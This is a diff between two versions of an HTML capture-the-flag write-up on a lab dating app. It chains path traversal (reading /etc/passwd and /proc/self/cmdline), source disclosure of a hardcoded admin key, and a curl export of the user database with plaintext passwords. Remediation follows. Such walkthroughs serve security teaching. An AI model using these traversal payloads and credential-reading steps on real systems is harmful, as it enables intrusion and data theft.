-  <p>The irony of that bio would become apparent very quickly.</p>
+    <p>The irony of that bio would become apparent very quickly.</p>
+  </section>
 
-  <!-- VULN 1 -->
-  <div class="divider">◆</div>
-  <div class="section-label">03 — Finding #1</div>
-  <h2>Path Traversal via <code>fetch_layout</code></h2>
+  <div class="sep"><span class="sep-inner">finding 01</span></div>
 
-  <p>Viewing cupid's profile page, I opened DevTools and inspected the JavaScript. A function called <code>loadTheme()</code> stood out immediately:</p>
+  <section class="section" id="traversal">
+    <div class="section-marker">
+      <span class="section-num">03</span>
+      <div class="section-line"></div>
+      <span class="section-tag">Path Traversal</span>
+    </div>
+    <h2>Path Traversal via <code>fetch_layout</code></h2>
 
-  <pre><span class="label">profile.html — JavaScript</span><span class="kw">function</span> <span class="fn">loadTheme</span>(layoutName) {
+    <p>Viewing cupid's profile, I opened DevTools and inspected the JavaScript. A function called <code>loadTheme()</code> stood out immediately:</p>
+
+    <pre>
+      <div class="pre-header">
+        <div class="pre-dots">
+          <div class="pre-dot" style="background:#ff5f57"></div>
+          <div class="pre-dot" style="background:#febc2e"></div>
+          <div class="pre-dot" style="background:#28c840"></div>
+        </div>
+        <span class="pre-filename">profile.html — JavaScript</span>
+      </div>
+      <div class="pre-body"><span class="kw">function</span> <span class="fn">loadTheme</span>(layoutName) {
   <span class="cm">// Feature: Dynamic Layout Fetching</span>
   <span class="fn">fetch</span>(<span class="str">`/api/fetch_layout?layout=<span class="var">${layoutName}</span>`</span>)
     .then(r => r.text())
     .then(html => {
-      <span class="cm">// Client-side rendering of the fetched template</span>
       <span class="kw">let</span> rendered = html.<span class="fn">replace</span>(<span class="str">'__USERNAME__'</span>, username)
                          .<span class="fn">replace</span>(<span class="str">'__BIO__'</span>, bioText);
       document.<span class="fn">getElementById</span>(<span class="str">'bio-container'</span>).innerHTML = rendered;
     });
-}</pre>
+}</div>
+    </pre>
 
-  <p>The <code>layout</code> parameter is passed directly to a server-side file fetch with no validation beyond a blocklist. The value comes from a <code>&lt;select&gt;</code> dropdown — client-side only, trivially bypassed. My first test was the classic path traversal payload:</p>
+    <p>The <code>layout</code> parameter is passed directly to a server-side file fetch with no validation beyond a blocklist. The value comes from a <code>&lt;select&gt;</code> dropdown — client-side only, trivially bypassed. First test: the classic traversal payload.</p>
 
-  <div class="terminal">
-    <div class="terminal-bar">
-      <div class="terminal-dot" style="background:#ff5f57"></div>
-      <div class="terminal-dot" style="background:#febc2e"></div>
-      <div class="terminal-dot" style="background:#28c840"></div>
-      <div class="terminal-title">browser / curl</div>
-    </div>
-    <div class="terminal-body">
-<span class="prompt">GET</span> <span class="hi">http://10.48.133.124:5000/api/fetch_layout?layout=../../../../../etc/passwd</span>
-<br><br>
-<span class="out">root:x:0:0:root:/root:/bin/bash</span>
-<span class="out">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span>
-<span class="out">...</span>
-    </div>
-  </div>
+    <div class="terminal">
+      <div class="term-header">
+        <div class="term-dot" style="background:#ff5f57"></div>
+        <div class="term-dot" style="background:#febc2e"></div>
+        <div class="term-dot" style="background:#28c840"></div>
+        <span class="term-title">curl / browser</span>
+      </div>
+      <div class="term-body">
+<span class="t-prompt">GET</span> <span class="t-path">/api/fetch_layout?layout=../../../../../etc/passwd</span>
 
-  <p>It worked. The server returned <code>/etc/passwd</code> in full — confirming unauthenticated path traversal with no path canonicalization and a broken blocklist that only checked for the string <code>cupid.db</code> or the <code>.db</code> extension.</p>
-
-  <!-- VULN 2 -->
-  <div class="divider">◆</div>
-  <div class="section-label">04 — Finding #2</div>
-  <h2>Source Code Disclosure via <code>/proc/self</code></h2>
-
-  <p>With traversal confirmed, the next goal was locating the application source code. Rather than guessing paths, I used <code>/proc/self/cmdline</code> — a Linux pseudo-file that reveals the exact command used to launch the current process (the Flask app itself):</p>
-
-  <div class="terminal">
-    <div class="terminal-bar">
-      <div class="terminal-dot" style="background:#ff5f57"></div>
-      <div class="terminal-dot" style="background:#febc2e"></div>
-      <div class="terminal-dot" style="background:#28c840"></div>
-      <div class="terminal-title">proc enumeration</div>
-    </div>
-    <div class="terminal-body">
-<span class="prompt">GET</span> <span class="hi">/api/fetch_layout?layout=../../../../../proc/self/cmdline</span>
-<br><br>
-<span class="flag">/usr/bin/python3/opt/Valenfind/app.py</span>
-    </div>
-  </div>
-
-  <p>This revealed two critical pieces of information: the Python interpreter path and — most importantly — the <strong>exact application root</strong>: <code>/opt/Valenfind/</code>. No guessing required. I now read the source directly:</p>
-
-  <div class="terminal">
-    <div class="terminal-bar">
-      <div class="terminal-dot" style="background:#ff5f57"></div>
-      <div class="terminal-dot" style="background:#febc2e"></div>
-      <div class="terminal-dot" style="background:#28c840"></div>
-      <div class="terminal-title">source disclosure</div>
-    </div>
-    <div class="terminal-body">
-<span class="prompt">GET</span> <span class="hi">/api/fetch_layout?layout=../../../../../opt/Valenfind/app.py</span>
-<br><br>
-<span class="out">import os, sqlite3, hashlib</span>
-<span class="out">from flask import Flask, render_template, ...</span>
-<span class="flag">ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"</span>
-<span class="out">DATABASE = 'cupid.db'</span>
-<span class="out">...</span>
-    </div>
-  </div>
-
-  <p>The source code was fully readable. Within seconds of scanning it, two findings jumped out:</p>
-
-  <div class="finding">
-    <div class="finding-header">
-      <span class="finding-num">FIND-01</span>
-      <div>
-        <h3 style="margin:0 0 4px;"><span class="badge critical">Critical</span> Hardcoded Admin API Key</h3>
+<span class="t-out">root:x:0:0:root:/root:/bin/bash</span>
+<span class="t-out">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span>
+<span class="t-out">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span>
+<span class="t-out">...</span>
       </div>
     </div>
-    <pre style="margin:0;"><span class="var">ADMIN_API_KEY</span> = <span class="str">"CUPID_MASTER_KEY_2024_XOXO"</span></pre>
-    <p style="margin-top:12px; margin-bottom:0; font-size:0.92rem;">A hardcoded secret in source code is essentially a public secret. Anyone who can read this file — via path traversal, version control leaks, or misconfigured logging — now has admin access.</p>
-  </div>
 
-  <div class="finding">
-    <div class="finding-header">
-      <span class="finding-num">FIND-02</span>
-      <div>
-        <h3 style="margin:0 0 4px;"><span class="badge critical">Critical</span> Unauthenticated Database Export Endpoint</h3>
+    <p>It worked. The server returned <code>/etc/passwd</code> in full — confirming unauthenticated path traversal. No path canonicalization, and a broken blocklist that only checked for <code>cupid.db</code> or the <code>.db</code> extension.</p>
+
+    <div class="finding critical">
+      <div class="finding-title">
+        <span class="badge critical">Critical</span>
+        <h4>CWE-22 — Path Traversal in <code>fetch_layout</code></h4>
+      </div>
+      <p>Arbitrary file read on the server. The blocklist-based defence is trivially bypassed. Any file the app process can read is exposed — configuration, keys, source code, system files.</p>
+    </div>
+  </section>
+
+  <div class="sep"><span class="sep-inner">finding 02</span></div>
+
+  <section class="section" id="source">
+    <div class="section-marker">
+      <span class="section-num">04</span>
+      <div class="section-line"></div>
+      <span class="section-tag">Source Disclosure</span>
+    </div>
+    <h2>Source Code via <code>/proc/self</code></h2>
+
+    <p>With traversal confirmed, the next goal was locating the application source. Rather than guessing paths, I used <code>/proc/self/cmdline</code> — a Linux pseudo-file that reveals the exact command used to launch the current process:</p>
+
+    <div class="terminal">
+      <div class="term-header">
+        <div class="term-dot" style="background:#ff5f57"></div>
+        <div class="term-dot" style="background:#febc2e"></div>
+        <div class="term-dot" style="background:#28c840"></div>
+        <span class="term-title">proc enumeration</span>
+      </div>
+      <div class="term-body">
+<span class="t-prompt">GET</span> <span class="t-path">/api/fetch_layout?layout=../../../../../proc/self/cmdline</span>
+
+<span class="t-flag">/usr/bin/python3/opt/Valenfind/app.py</span>
       </div>
     </div>
-    <pre style="margin:0;"><span class="kw">@app.route</span>(<span class="str">'/api/admin/export_db'</span>)
+
+    <p>This revealed the Python interpreter and — most importantly — the exact application root: <code>/opt/Valenfind/</code>. No guessing. I read the source directly:</p>
+
+    <div class="terminal">
+      <div class="term-header">
+        <div class="term-dot" style="background:#ff5f57"></div>
+        <div class="term-dot" style="background:#febc2e"></div>
+        <div class="term-dot" style="background:#28c840"></div>
+        <span class="term-title">source disclosure</span>
+      </div>
+      <div class="term-body">
+<span class="t-prompt">GET</span> <span class="t-path">/api/fetch_layout?layout=../../../../../opt/Valenfind/app.py</span>
+
+<span class="t-out">import os, sqlite3, hashlib</span>
+<span class="t-out">from flask import Flask, render_template, ...</span>
+<span class="t-flag">ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"</span>
+<span class="t-out">DATABASE = 'cupid.db'</span>
+<span class="t-out">...</span>
+      </div>
+    </div>
+
+    <p>The source was fully readable. Two findings jumped out within seconds:</p>
+
+    <div class="finding critical">
+      <div class="finding-title">
+        <span class="badge critical">Critical</span>
+        <h4>CWE-798 — Hardcoded Admin API Key</h4>
+      </div>
+      <pre style="margin:0; background:transparent; border:none; padding:0;">
+        <div class="pre-body" style="padding: 10px 0 0;"><span class="var">ADMIN_API_KEY</span> = <span class="str">"CUPID_MASTER_KEY_2024_XOXO"</span></div>
+      </pre>
+    </div>
+
+    <div class="finding critical">
+      <div class="finding-title">
+        <span class="badge critical">Critical</span>
+        <h4>CWE-284 — Unauthenticated Database Export Endpoint</h4>
+      </div>
+      <pre style="margin:0; background:transparent; border:none; padding:0;">
+        <div class="pre-body" style="padding: 10px 0 0;"><span class="kw">@app.route</span>(<span class="str">'/api/admin/export_db'</span>)
 <span class="kw">def</span> <span class="fn">export_db</span>():
     auth_header = request.headers.<span class="fn">get</span>(<span class="str">'X-Valentine-Token'</span>)
     <span class="kw">if</span> auth_header == <span class="var">ADMIN_API_KEY</span>:
-        <span class="kw">return</span> <span class="fn">send_file</span>(<span class="var">DATABASE</span>, as_attachment=<span class="kw">True</span>)</pre>
-    <p style="margin-top:12px; margin-bottom:0; font-size:0.92rem;">The entire SQLite database can be downloaded by anyone who knows the API key — no login session, no IP restriction, no rate limit. The "authentication" is a single header check against a hardcoded string we already know.</p>
-  </div>
+        <span class="kw">return</span> <span class="fn">send_file</span>(<span class="var">DATABASE</span>, as_attachment=<span class="kw">True</span>)</div>
+      </pre>
+      <p style="margin-top: 12px;">The entire SQLite database can be downloaded by anyone who knows the API key — no login session, no IP restriction, no rate limit. The "auth" is a single header check against a hardcoded string we already have.</p>
+    </div>
+  </section>
 
-  <!-- VULN 3 -->
-  <div class="divider">◆</div>
-  <div class="section-label">05 — Exploitation</div>
-  <h2>Full Database Exfiltration</h2>
+  <div class="sep"><span class="sep-inner">exploitation</span></div>
 
-  <p>With the hardcoded key in hand, exploiting the export endpoint was a single <code>curl</code> command:</p>
+  <section class="section" id="exploit">
+    <div class="section-marker">
+      <span class="section-num">05</span>
+      <div class="section-line"></div>
+      <span class="section-tag">Exploitation</span>
+    </div>
+    <h2>Full Database Exfiltration</h2>
 
-  <pre><span class="label">bash</span><span class="fn">curl</span> http://10.48.133.124:5000/api/admin/export_db \
+    <p>With the hardcoded key in hand, exploiting the export endpoint was a single command:</p>
+
+    <pre>
+      <div class="pre-header">
+        <div class="pre-dots">
+          <div class="pre-dot" style="background:#ff5f57"></div>
+          <div class="pre-dot" style="background:#febc2e"></div>
+          <div class="pre-dot" style="background:#28c840"></div>
+        </div>
+        <span class="pre-filename">bash</span>
+      </div>
+      <div class="pre-body"><span class="fn">curl</span> http://10.48.133.124:5000/api/admin/export_db \
   -H <span class="str">"X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO"</span> \
-  --output valenfind.db</pre>
+  --output valenfind.db
 
-  <p>The server responded with a full SQLite database download. I opened it locally:</p>
+<span class="fn">sqlite3</span> valenfind.db <span class="str">"SELECT * FROM users;"</span></div>
+    </pre>
 
-  <pre><span class="label">sqlite3</span><span class="fn">sqlite3</span> valenfind.db
-<span class="fn">SELECT</span> * <span class="kw">FROM</span> users;</pre>
-
-  <div class="terminal">
-    <div class="terminal-bar">
-      <div class="terminal-dot" style="background:#ff5f57"></div>
-      <div class="terminal-dot" style="background:#febc2e"></div>
-      <div class="terminal-dot" style="background:#28c840"></div>
-      <div class="terminal-title">sqlite3 valenfind.db</div>
+    <div class="terminal">
+      <div class="term-header">
+        <div class="term-dot" style="background:#ff5f57"></div>
+        <div class="term-dot" style="background:#febc2e"></div>
+        <div class="term-dot" style="background:#28c840"></div>
+        <span class="term-title">sqlite3 valenfind.db</span>
+      </div>
+      <div class="term-body">
+<span class="t-out">1|romeo_montague|juliet123|Romeo Montague|...</span>
+<span class="t-out">2|casanova_official|secret123|Giacomo Casanova|...</span>
+<span class="t-out">3|cleopatra_queen|caesar_salad|Cleopatra VII|...</span>
+<span class="t-out">4|sherlock_h|watson_is_cool|Sherlock Holmes|...</span>
+<span class="t-out">5|gatsby_great|green_light|Jay Gatsby|...</span>
+<span class="t-out">6|jane_eyre|rochester_blind|Jane Eyre|...</span>
+<span class="t-out">7|count_dracula|sunlight_sucks|Vlad Dracula|...</span>
+<span class="t-flag">8|cupid|admin_root_x99|System Administrator|FLAG: THM{...REDACTED...}</span>
+<span class="t-out">9|admin|admin|&lt;script&gt;alert(1)&lt;/script&gt;|alien@gmail.com</span>
+      </div>
     </div>
-    <div class="terminal-body">
-<span class="out">1|romeo_montague|juliet123|Romeo Montague|romeo@verona.cupid|...|Looking for my Juliet.|15|romeo.jpg</span>
-<span class="out">2|casanova_official|secret123|Giacomo Casanova|loverboy@venice.kiss|...|Just here for the free chocolate.|5|casanova.jpg</span>
-<span class="out">3|cleopatra_queen|caesar_salad|Cleopatra VII|queen@nile.river|...|I rule an empire, but I can't rule my heart.|89|cleo.jpg</span>
-<span class="out">4|sherlock_h|watson_is_cool|Sherlock Holmes|detective@baker.street|...|Observant, logical, and looking for a mystery.|22|sherlock.jpg</span>
-<span class="out">5|gatsby_great|green_light|Jay Gatsby|jay@westegg.party|...|Throwing parties every weekend.|106|gatsby.jpg</span>
-<span class="out">6|jane_eyre|rochester_blind|Jane Eyre|jane@thornfield.book|...|Quiet, independent, looking for a connection.|33|jane.jpg</span>
-<span class="out">7|count_dracula|sunlight_sucks|Vlad Dracula|vlad@night.walker|...|I love long walks at night and biting... necks?|666|dracula.jpg</span>
-<span class="flag">8|cupid|admin_root_x99|System Administrator|cupid@internal.cupid|...|FLAG: THM{...REDACTED...}|999|cupid.jpg</span>
-<span class="out">9|admin|admin|&lt;script&gt;alert(1)&lt;/script&gt;|alien@gmail.com|...|1|default.jpg</span>
-    </div>
-  </div>
 
-  <p>The flag was stored in the <code>address</code> field of the <code>cupid</code> account — the system administrator account with 999 likes and the tagline "I keep the database secure. No peeking." The irony writes itself.</p>
+    <p>The flag was in the <code>address</code> field of the <code>cupid</code> account — the system administrator with 999 likes and the bio "I keep the database secure. No peeking." The dump also revealed every user's <strong>plaintext password</strong> — no hashing, no salting — and an XSS payload in the admin account's name field, suggesting it was also an intended test vector.</p>
+  </section>
 
-  <p>The dump also revealed every user's plaintext password — no hashing, no salting — and an <code>admin</code> account whose real_name field contained a stored XSS payload (<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>), suggesting this was also a test vector in the challenge.</p>
+  <div class="sep"><span class="sep-inner">attack chain</span></div>
 
   <!-- ATTACK CHAIN -->
-  <div class="divider">◆</div>
-  <div class="section-label">06 — Attack Chain</div>
-  <h2>How the Vulnerabilities Chained</h2>
+  <section class="section">
+    <div class="section-marker">
+      <span class="section-num">06</span>
+      <div class="section-line"></div>
+      <span class="section-tag">Chain</span>
+    </div>
+    <h2>How the Vulnerabilities Chained</h2>
 
-  <div class="chain">
-    <div class="chain-step"><span class="step-num">Step 1</span>JS recon in DevTools</div>
-    <div class="chain-arrow">→</div>
-    <div class="chain-step"><span class="step-num">Step 2</span>Path traversal via <code>?layout=</code></div>
-    <div class="chain-arrow">→</div>
-    <div class="chain-step"><span class="step-num">Step 3</span><code>/proc/self/cmdline</code> → app path</div>
-    <div class="chain-arrow">→</div>
-    <div class="chain-step"><span class="step-num">Step 4</span>Read <code>app.py</code> → hardcoded key</div>
-    <div class="chain-arrow">→</div>
-    <div class="chain-step"><span class="step-num">Step 5</span>Call export endpoint → full DB</div>
-    <div class="chain-arrow">→</div>
-    <div class="chain-step"><span class="step-num">Step 6</span>🚩 Flag captured</div>
-  </div>
+    <div class="chain">
+      <div class="chain-step">
+        <div class="cs-n">01</div>
+        <div class="cs-label">JS recon in DevTools</div>
+      </div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step">
+        <div class="cs-n">02</div>
+        <div class="cs-label">Path traversal via <code style="font-size:0.7rem">?layout=</code></div>
+      </div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step">
+        <div class="cs-n">03</div>
+        <div class="cs-label"><code style="font-size:0.7rem">/proc/self/cmdline</code> → app path</div>
+      </div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step">
+        <div class="cs-n">04</div>
+        <div class="cs-label">Read <code style="font-size:0.7rem">app.py</code> → hardcoded key</div>
+      </div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step">
+        <div class="cs-n">05</div>
+        <div class="cs-label">Call export endpoint → full DB</div>
+      </div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step" style="border-color: rgba(255,71,87,0.3)!important;">
+        <div class="cs-n" style="color:var(--red)">06</div>
+        <div class="cs-label" style="color:var(--red)">🚩 Flag captured</div>
+      </div>
+    </div>
 
-  <p>No single vulnerability was enough on its own. The path traversal opened the door to source code; the source code handed over the key; the key unlocked the database; the database contained the flag. This is why vulnerability chaining is such a core skill in web exploitation — individually these might score low on CVSS, but together they represent total compromise.</p>
+    <p>No single vulnerability was enough on its own. Path traversal opened the door to source code; source code handed over the key; the key unlocked the database; the database contained the flag. This is why vulnerability chaining is a core skill — individually these might score low on CVSS, but together they represent total compromise.</p>
+  </section>
 
-  <!-- SUMMARY TABLE -->
-  <div class="divider">◆</div>
-  <div class="section-label">07 — Vulnerability Summary</div>
-  <h2>All Findings at a Glance</h2>
+  <div class="sep"><span class="sep-inner">vulnerability summary</span></div>
 
-  <table>
-    <thead>
-      <tr>
-        <th>Finding</th>
-        <th>Severity</th>
-        <th>CWE</th>
-        <th>Impact</th>
-      </tr>
-    </thead>
-    <tbody>
-      <tr>
-        <td>Path traversal in <code>fetch_layout</code></td>
-        <td><span class="badge critical">Critical</span></td>
-        <td>CWE-22</td>
-        <td>Arbitrary file read on server</td>
-      </tr>
-      <tr>
-        <td>Hardcoded admin API key in source</td>
-        <td><span class="badge critical">Critical</span></td>
-        <td>CWE-798</td>
-        <td>Full admin API access</td>
-      </tr>
-      <tr>
-        <td>Unauthenticated database export endpoint</td>
-        <td><span class="badge critical">Critical</span></td>
-        <td>CWE-284</td>
-        <td>Full DB exfiltration</td>
-      </tr>
-      <tr>
-        <td>Plaintext password storage</td>
-        <td><span class="badge high">High</span></td>
-        <td>CWE-256</td>
-        <td>All credentials compromised on DB leak</td>
-      </tr>
-      <tr>
-        <td>No CSRF tokens on POST forms</td>
-        <td><span class="badge high">High</span></td>
-        <td>CWE-352</td>
-        <td>Silent like/action forgery</td>
-      </tr>
-      <tr>
-        <td><code>innerHTML</code> with server-fetched content</td>
-        <td><span class="badge high">High</span></td>
-        <td>CWE-79</td>
-        <td>Stored/reflected XSS</td>
-      </tr>
-      <tr>
-        <td>User enumeration via dashboard + sequential IDs</td>
-        <td><span class="badge medium">Medium</span></td>
-        <td>CWE-200</td>
-        <td>IDOR surface, account enumeration</td>
-      </tr>
-      <tr>
-        <td>Internal filenames exposed in HTML select</td>
-        <td><span class="badge low">Low</span></td>
-        <td>CWE-538</td>
-        <td>Aids path traversal enumeration</td>
-      </tr>
-    </tbody>
-  </table>
+  <!-- TABLE -->
+  <section class="section" id="summary">
+    <div class="section-marker">
+      <span class="section-num">07</span>
+      <div class="section-line"></div>
+      <span class="section-tag">Summary</span>
+    </div>
+    <h2>All Findings at a Glance</h2>
+
+    <div class="table-wrap">
+      <table>
+        <thead>
+          <tr>
+            <th>Finding</th>
+            <th>Severity</th>
+            <th>CWE</th>
+            <th>Impact</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>Path traversal in <code>fetch_layout</code></td>
+            <td><span class="badge critical">Critical</span></td>
+            <td style="font-family:'DM Mono',monospace;font-size:0.78rem;color:var(--muted)">CWE-22</td>
+            <td>Arbitrary file read</td>
+          </tr>
+          <tr>
+            <td>Hardcoded admin API key in source</td>
+            <td><span class="badge critical">Critical</span></td>
+            <td style="font-family:'DM Mono',monospace;font-size:0.78rem;color:var(--muted)">CWE-798</td>
+            <td>Full admin API access</td>
+          </tr>
+          <tr>
+            <td>Unauthenticated database export endpoint</td>
+            <td><span class="badge critical">Critical</span></td>
+            <td style="font-family:'DM Mono',monospace;font-size:0.78rem;color:var(--muted)">CWE-284</td>
+            <td>Full DB exfiltration</td>
+          </tr>
+          <tr>
+            <td>Plaintext password storage</td>
+            <td><span class="badge high">High</span></td>
+            <td style="font-family:'DM Mono',monospace;font-size:0.78rem;color:var(--muted)">CWE-256</td>
+            <td>All credentials compromised</td>
+          </tr>
+          <tr>
+            <td>No CSRF tokens on POST forms</td>
+            <td><span class="badge high">High</span></td>
+            <td style="font-family:'DM Mono',monospace;font-size:0.78rem;color:var(--muted)">CWE-352</td>
+            <td>Silent action forgery</td>
+          </tr>
+          <tr>
+            <td><code>innerHTML</code> with server-fetched content</td>
+            <td><span class="badge high">High</span></td>
+            <td style="font-family:'DM Mono',monospace;font-size:0.78rem;color:var(--muted)">CWE-79</td>
+            <td>Stored/reflected XSS</td>
+          </tr>
+          <tr>
+            <td>User enumeration via dashboard + sequential IDs</td>
+            <td><span class="badge medium">Medium</span></td>
+            <td style="font-family:'DM Mono',monospace;font-size:0.78rem;color:var(--muted)">CWE-200</td>
+            <td>IDOR surface, account enumeration</td>
+          </tr>
+          <tr>
+            <td>Internal filenames exposed in HTML select</td>
+            <td><span class="badge low">Low</span></td>
+            <td style="font-family:'DM Mono',monospace;font-size:0.78rem;color:var(--muted)">CWE-538</td>
+            <td>Aids traversal enumeration</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <div class="sep"><span class="sep-inner">remediation</span></div>
 
   <!-- REMEDIATION -->
-  <div class="divider">◆</div>
-  <div class="section-label">08 — Remediation</div>
-  <h2>How to Fix These Issues</h2>
+  <section class="section">
+    <div class="section-marker">
+      <span class="section-num">08</span>
+      <div class="section-line"></div>
+      <span class="section-tag">Fixes</span>
+    </div>
+    <h2>How to Fix These Issues</h2>
 
-  <h3>1. Fix the Path Traversal — Use an Allowlist</h3>
-  <p>The existing blocklist approach (<em>"block if it contains cupid.db"</em>) is fundamentally broken. Replace it with a strict allowlist:</p>
-  <pre><span class="label">app.py — fixed fetch_layout</span><span class="var">ALLOWED_LAYOUTS</span> = {<span class="str">'theme_classic.html'</span>, <span class="str">'theme_modern.html'</span>, <span class="str">'theme_romance.html'</span>}
+    <h3>1. Replace the blocklist with an allowlist</h3>
+    <p>The existing blocklist check (<em>"block if it contains cupid.db"</em>) is fundamentally broken — there are infinite ways to reference a file. Allowlists are the only reliable pattern:</p>
+    <pre>
+      <div class="pre-header">
+        <div class="pre-dots">
+          <div class="pre-dot" style="background:#ff5f57"></div>
+          <div class="pre-dot" style="background:#febc2e"></div>
+          <div class="pre-dot" style="background:#28c840"></div>
+        </div>
+        <span class="pre-filename">app.py — fixed fetch_layout</span>
+      </div>
+      <div class="pre-body"><span class="var">ALLOWED_LAYOUTS</span> = {<span class="str">'theme_classic.html'</span>, <span class="str">'theme_modern.html'</span>, <span class="str">'theme_romance.html'</span>}
 
 <span class="kw">def</span> <span class="fn">fetch_layout</span>():
     layout_file = request.args.<span class="fn">get</span>(<span class="str">'layout'</span>, <span class="str">'theme_classic.html'</span>)
     <span class="kw">if</span> layout_file <span class="kw">not in</span> <span class="var">ALLOWED_LAYOUTS</span>:
-        <span class="kw">return</span> <span class="str">"Invalid layout"</span>, <span class="num">400</span>
-    <span class="cm"># safe to proceed</span></pre>
+        <span class="kw">return</span> <span class="str">"Invalid layout"</span>, <span class="num">400</span></div>
+    </pre>
 
-  <h3>2. Never Hardcode Secrets — Use Environment Variables</h3>
-  <pre><span class="label">app.py — fixed secret handling</span><span class="cm"># Bad</span>
+    <h3>2. Never hardcode secrets — use environment variables</h3>
+    <pre>
+      <div class="pre-header">
+        <div class="pre-dots">
+          <div class="pre-dot" style="background:#ff5f57"></div>
+          <div class="pre-dot" style="background:#febc2e"></div>
+          <div class="pre-dot" style="background:#28c840"></div>
+        </div>
+        <span class="pre-filename">app.py — secret handling</span>
+      </div>
+      <div class="pre-body"><span class="cm"># Bad</span>
 <span class="var">ADMIN_API_KEY</span> = <span class="str">"CUPID_MASTER_KEY_2024_XOXO"</span>
 
 <span class="cm"># Good</span>
 <span class="var">ADMIN_API_KEY</span> = os.<span class="fn">getenv</span>(<span class="str">'ADMIN_API_KEY'</span>)
 <span class="kw">if not</span> <span class="var">ADMIN_API_KEY</span>:
-    <span class="kw">raise</span> RuntimeError(<span class="str">"ADMIN_API_KEY not set"</span>)</pre>
+    <span class="kw">raise</span> RuntimeError(<span class="str">"ADMIN_API_KEY not set"</span>)</div>
+    </pre>
 
-  <h3>3. Hash Passwords with bcrypt or Argon2</h3>
-  <pre><span class="label">app.py — password hashing</span><span class="kw">from</span> werkzeug.security <span class="kw">import</span> generate_password_hash, check_password_hash
+    <h3>3. Hash passwords with bcrypt or Argon2</h3>
+    <pre>
+      <div class="pre-header">
+        <div class="pre-dots">
+          <div class="pre-dot" style="background:#ff5f57"></div>
+          <div class="pre-dot" style="background:#febc2e"></div>
+          <div class="pre-dot" style="background:#28c840"></div>
+        </div>
+        <span class="pre-filename">app.py — password hashing</span>
+      </div>
+      <div class="pre-body"><span class="kw">from</span> werkzeug.security <span class="kw">import</span> generate_password_hash, check_password_hash
 
 <span class="cm"># On register</span>
 hashed = <span class="fn">generate_password_hash</span>(password)
 
 <span class="cm"># On login</span>
 <span class="kw">if</span> user <span class="kw">and</span> <span class="fn">check_password_hash</span>(user[<span class="str">'password'</span>], password):
-    ...</pre>
+    ...</div>
+    </pre>
 
-  <h3>4. Replace <code>innerHTML</code> with DOMPurify</h3>
-  <pre><span class="label">profile.html — XSS fix</span><span class="cm">// Bad</span>
+    <h3>4. Sanitize before injecting into the DOM</h3>
+    <pre>
+      <div class="pre-header">
+        <div class="pre-dots">
+          <div class="pre-dot" style="background:#ff5f57"></div>
+          <div class="pre-dot" style="background:#febc2e"></div>
+          <div class="pre-dot" style="background:#28c840"></div>
+        </div>
+        <span class="pre-filename">profile.html — XSS fix</span>
+      </div>
+      <div class="pre-body"><span class="cm">// Bad</span>
 document.<span class="fn">getElementById</span>(<span class="str">'bio-container'</span>).innerHTML = rendered;
 
 <span class="cm">// Good — sanitize before injecting</span>
-document.<span class="fn">getElementById</span>(<span class="str">'bio-container'</span>).innerHTML = DOMPurify.<span class="fn">sanitize</span>(rendered);</pre>
+document.<span class="fn">getElementById</span>(<span class="str">'bio-container'</span>).innerHTML = DOMPurify.<span class="fn">sanitize</span>(rendered);</div>
+    </pre>
+  </section>
 
-  <h3>5. Add CSRF Tokens to All State-Changing Forms</h3>
-  <p>Flask-WTF handles this automatically. Enable it globally and add <code>{{ form.hidden_tag() }}</code> to every form template, or use the <code>CSRFProtect</code> extension for non-WTF forms.</p>
+  <div class="sep"><span class="sep-inner">takeaways</span></div>
 
-  <!-- CONCLUSION -->
-  <div class="divider">◆</div>
-  <div class="section-label">09 — Takeaways</div>
-  <h2>Key Lessons</h2>
+  <!-- TAKEAWAYS -->
+  <section class="section">
+    <div class="section-marker">
+      <span class="section-num">09</span>
+      <div class="section-line"></div>
+      <span class="section-tag">Takeaways</span>
+    </div>
+    <h2>Key Lessons</h2>
 
-  <div class="callout info">
-    <strong> Vulnerability chaining matters</strong>
-    No single bug here was catastrophic in isolation. Path traversal alone gives file read. Hardcoded keys alone are useless without knowing the endpoint. The chain is what causes total compromise — always think about how findings connect.
-  </div>
+    <div class="note info">
+      <strong>Vulnerability chaining matters</strong>
+      <p>No single bug here was catastrophic in isolation. Path traversal alone gives file read. Hardcoded keys are useless without knowing the endpoint. The chain is what causes total compromise — always think about how findings connect.</p>
+    </div>
 
-  <div class="callout warn">
-    <strong> Blocklists always lose</strong>
-    The developer tried to block <code>cupid.db</code> and <code>.db</code> extensions. But there are infinite ways to reference a file — double encoding, case variation, symlinks, alternate extensions. Allowlists are the only reliable pattern.
-  </div>
+    <div class="note warn">
+      <strong>Blocklists always lose</strong>
+      <p>The developer tried to block <code style="background: rgba(255,140,66,0.1); color: var(--orange); font-size:0.8em">.db</code> and <code style="background: rgba(255,140,66,0.1); color: var(--orange); font-size:0.8em">cupid.db</code>. But there are infinite ways to reference a file — double encoding, case variation, symlinks. Allowlists are the only reliable pattern.</p>
+    </div>
 
-  <div class="callout">
-    <strong> /proc/self is your friend</strong>
-    When you have path traversal on a Linux system, <code>/proc/self/cmdline</code> and <code>/proc/self/environ</code> are often the fastest path to app secrets and configuration — no guessing required.
-  </div>
+    <div class="note red">
+      <strong>/proc/self is your friend</strong>
+      <p>When you have path traversal on Linux, <code style="background: rgba(255,71,87,0.1); color: var(--red); font-size:0.8em">/proc/self/cmdline</code> and <code style="background: rgba(255,71,87,0.1); color: var(--red); font-size:0.8em">/proc/self/environ</code> are the fastest path to app secrets and config — no guessing required.</p>
+    </div>
 
-  <p>ValenFind was a well-constructed CTF that reflects real-world vulnerability patterns found in actual web applications. The cupid bio — <em>"I keep the database secure. No peeking."</em> — was the perfect troll from the challenge author. The database was never secure, and we definitely peeked.</p>
